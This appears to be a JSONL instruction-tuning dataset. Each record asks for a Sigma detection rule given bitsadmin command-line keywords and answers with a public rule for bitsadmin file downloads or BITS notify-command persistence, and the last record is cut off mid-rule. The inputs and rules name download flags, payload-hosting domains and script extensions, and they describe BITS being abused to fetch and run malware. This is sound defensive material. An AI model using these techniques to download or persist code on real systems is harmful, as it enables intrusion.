{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile http", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer --create /addfile http", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin bitsadmin /transfer /create /addfile http", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile http", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile ://1 ://2 ://3 ://4 ://5 ://6 ://7 ://8 ://9 ://7-", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile ://1 ://2 ://3 ://4 ://5 :/\\\"/6\\\" ://7 ://8 ://9 ://7-", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer --create /addfile ://1 ://2 ://3 ://4 ://5 ://6 ://7 ://8 ://9 ://7-", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin bitsadmin /transfer /create /addfile ://1 ://2 ://3 ://4 ://5 ://6 ://7 ://8 ://9 ://7-", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile ://1 ://2 ://3 ://4 ://5 ://6 ://7 ://8 ://9 ://7-", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile .githubusercontent.com anonfiles.com \\\"cdn.disco\\\"rdapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin bitsadmin /transfer /create /addfile .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile .7z .asax .ashx .asmx .asp .aspx .bat .cfm .cgi .chm .cmd .dll .gif .jpeg .jpg .jsp .jspx .log .png .ps1 .psm1 .rar .scf .sct .txt .vbe .vbs .war .wsf .wsh .xll .zip", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile .7z .asax .ashx .asmx .asp .aspx \\\".bat\\\" \\\".cfm\\\" .cgi .chm .cmd .dll .gif .jpeg .jpg .jsp .jspx .log .png .ps1 .psm1 .rar .scf .sct .txt .vbe .vbs .war .wsf .wsh .xll .zip", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer -create /addfile .7z .asax .ashx .asmx .asp .aspx .bat .cfm .cgi .chm .cmd .dll .gif .jpeg .jpg .jsp .jspx .log .png .ps1 .psm1 .rar .scf .sct .txt .vbe .vbs .war .wsf .wsh .xll .zip", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin bitsadmin /transfer /create /addfile .7z .asax .ashx .asmx .asp .aspx .cfm .cgi .chm .dll .gif .jpeg .jpg .jsp .jspx .log .png .psm1 .rar .scf .sct .txt .vbe .war .wsf .wsh .xll .zip", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /transfer /create /addfile .7z .asax .ashx .asmx .asp .aspx .bat .cfm .cgi .chm .cmd .dll .gif .jpeg .jpg .jsp .jspx .log .png .ps1 .psm1 .rar .scf .sct .txt .vbe .vbs .war .wsf .wsh .xll .zip", "output": "title: File Download Via Bitsadmin\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Michael Haag, FPT.EagleEye\ndate: 2017-03-09\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cmd:\n        CommandLine|contains: ' /transfer '\n    selection_cli_1:\n        CommandLine|contains:\n            - ' /create '\n            - ' /addfile '\n    selection_cli_2:\n        CommandLine|contains: 'http'\n    condition: selection_img and (selection_cmd or all of selection_cli_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /SetNotifyCmdLine %COMSPEC% cmd.exe regsvr32.exe /Addfile http: https: ftp: ftps:", "output": "title: Monitoring For Persistence Via BITS\nid: b9cbbc17-d00d-4e3d-a827-b06d03d2380d\nstatus: test\ndescription: |\n    BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished.\n    When the job runs on the system the command specified in the BITS job will be executed.\n    This can be abused by actors to create a backdoor within the system and for persistence.\n    It will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded.\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\n    - http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html\n    - https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394\nauthor: Sreeman\ndate: 2020-10-29\nmodified: 2024-01-25\ntags:\n    - attack.defense-evasion\n    - attack.t1197\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cli_notify_1:\n        CommandLine|contains: '/SetNotifyCmdLine'\n    selection_cli_notify_2:\n        CommandLine|contains:\n            - '%COMSPEC%'\n            - 'cmd.exe'\n            - 'regsvr32.exe'\n    selection_cli_add_1:\n        CommandLine|contains: '/Addfile'\n    selection_cli_add_2:\n        CommandLine|contains:\n            - 'http:'\n            - 'https:'\n            - 'ftp:'\n            - 'ftps:'\n    condition: selection_img and (all of selection_cli_notify_* or all of selection_cli_add_*)\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /SetNotifyCmdLine %COMSPEC% cmd.exe \\\"regsvr\\\"32.exe /Addfile http: https: ftp: ftps:", "output": "title: Monitoring For Persistence Via BITS\nid: b9cbbc17-d00d-4e3d-a827-b06d03d2380d\nstatus: test\ndescription: |\n    BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished.\n    When the job runs on the system the command specified in the BITS job will be executed.\n    This can be abused by actors to create a backdoor within the system and for persistence.\n    It will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded.\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\n    - http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html\n    - https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394\nauthor: Sreeman\ndate: 2020-10-29\nmodified: 2024-01-25\ntags:\n    - attack.defense-evasion\n    - attack.t1197\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cli_notify_1:\n        CommandLine|contains: '/SetNotifyCmdLine'\n    